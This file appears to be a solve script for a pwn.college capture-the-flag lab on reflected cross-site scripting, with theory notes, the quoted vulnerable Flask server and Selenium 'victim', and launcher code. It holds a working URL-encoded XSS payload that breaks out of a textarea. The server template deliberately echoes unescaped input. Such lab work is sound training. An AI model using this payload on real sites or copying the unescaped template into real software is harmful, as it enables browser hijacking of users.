import os
import re
import requests

"""
Theory:
The class of vulnerabilities in which injections occur into client-side web data (such as HTML)
is called Cross Site Scripting, or XSS for short.
In a typical XSS exploit, an attacker will cause their own code to be injected into (typically)
the HTML produced by a web application and viewed by a victim user. This will then allow the
attacker to gain some control within the victim's browser, leading to a number of potential
downstream shenanigans.
You will now have a /challenge/victim program that simulates a victim user visiting the web server.

Note:
Initially xss attacks used to download the malicious scripts run as part of the attack from an       
atacker controlled separate website. Hence these attack where called cross site scripting.

Reflected xss:
Inspecting the target website the atacker can see that the site takes unvalidated url parameter
input that is directly inserted into a textarea element. The attacker crafts a malicious link
using the target website url and a malicious script as url param. The attacker then spreads the
link i.e. via forum, email etc. to as many useres of the target website as possible. Once a user
clicks on the link, the attack is triggered.
"""

'''
Server:
#!/opt/pwn.college/python

import flask
import os

app = flask.Flask(__name__)

@app.route("/", methods=["GET"])
def challenge_get():
    return f"""
        <html><body>
        <h1>pwnmsg ephemeral message service</h1>
        The message:
        <form>
            <textarea name=msg>{flask.request.args.get("msg", "Type your message here!")}</textarea>
            <input type=submit value="Make URL!">
        </form>
        </body></html>
    """

app.secret_key = os.urandom(8)
app.config['SERVER_NAME'] = f"challenge.localhost:80"
app.run("challenge.localhost", 80)

Victim:
#!/opt/pwn.college/python

import psutil
import urllib
import atexit
import time
import sys
import os

from selenium import webdriver
from selenium.webdriver.firefox.options import Options as FirefoxOptions
from selenium.webdriver.firefox.service import Service as FirefoxService
from selenium.webdriver.common.by import By
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, WebDriverException

os.setuid(os.geteuid())
os.environ.clear()
os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

options = FirefoxOptions()
options.add_argument("--headless")
service = FirefoxService(log_path="/dev/null")
browser = webdriver.Firefox(service=service, options=options)
atexit.register(browser.quit)

if len(sys.argv) == 1:
    print(f"Usage: {sys.argv[0]} URL")
    sys.exit(1)

challenge_url = sys.argv[1]
url_parsed = urllib.parse.urlparse(challenge_url)
if url_parsed.hostname != "challenge.localhost":
    print("Hostname should be 'challenge.localhost'.")
    sys.exit(2)
if url_parsed.port not in {None, 80}:
    print("Port should be 80.")
    sys.exit(3)

print(f"Visiting {challenge_url}")
browser.get(challenge_url)
try:
    WebDriverWait(browser, 1).until(EC.alert_is_present())
except TimeoutException:
    print("Failure: JavaScript alert did not trigger...")
    sys.exit(3)
else:
    print("Alert triggered! Your reward:")
    print(open("/flag").read())
'''

pat0 = re.compile(r".*Running on http://challenge.localhost:80\n")
r1, w1 = os.pipe()
pid = os.fork()

if pid == -1:
	print("Error fork.")
	exit(1)

if pid == 0:
	os.close(r1)

	os.dup2(w1, 1)
	os.close(w1)

	# stdout as stderr
	os.dup2(1, 2)

	os.execv("/challenge/server", ["/challenge/server"])
	print("Error execv.")
	exit(1)

os.close(w1)

read_file = os.fdopen(r1, "r")

while True:
	line = read_file.readline()
	print(line, end="")

	m = pat0.match(line)
	if m:
		url = "http://challenge.localhost:80/?msg=%3C%2Ftextarea%3E%3Cscript%3Ealert%28%22PWNED%22%29%3B%3C%2Fscript%3E%3Ctextarea%20name%3D%22injected%22%3E"

		pid = os.fork()

		if pid == -1:
			print("Error fork.")
			exit(1)

		if pid == 0:
			os.execv("/challenge/victim", ["/challenge/victim", url])
			print("Error execv.")
			exit(1)
